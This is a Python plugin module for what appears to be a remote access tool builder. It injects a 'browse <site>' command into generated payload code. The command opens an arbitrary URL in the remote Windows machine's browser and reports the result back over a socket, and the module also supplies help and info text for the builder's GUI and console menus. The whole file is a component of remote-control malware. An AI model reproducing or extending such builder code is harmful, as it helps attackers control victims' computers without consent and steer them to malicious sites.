# GUI + CUI
# done
import library.modules.config as config

config.main()
interface = config.interface


def main(option):
    if option == 'generate':
        config.import_statements.append('import webbrowser')
        config.functions.append('''
def browse(site):
    site = site.split(' ',1)[1]
    open_bool = webbrowser.open(site)
    if open_bool:
        send_all(s,'[+]Opened site : ' + site)
    else:
        send_all(s,'[-]Could not open site : ' + site)''')
        config.logics.append('''
            elif command == "browse":
                browse(data)''')
        config.help_menu['browse <site>'] = 'Opens a new browser to the specified site'
    elif option == 'info':
        if interface == "GUI":
            return {
                "Name": "Browser component",
                "OS": "Windows",
                "Required Modules": "webbrowser",
                "Commands": "browse <site>",
                "Description": "Opens a new browser to the specified site"}
        elif interface == "CUI":
            print('\nName             : Browser component' \
                  '\nOS               : Windows' \
                  '\nRequired Modules : webbrowser' \
                  '\nCommands         : browse <site>' \
                  '\nDescription      : Opens a new browser to the specified site\n')
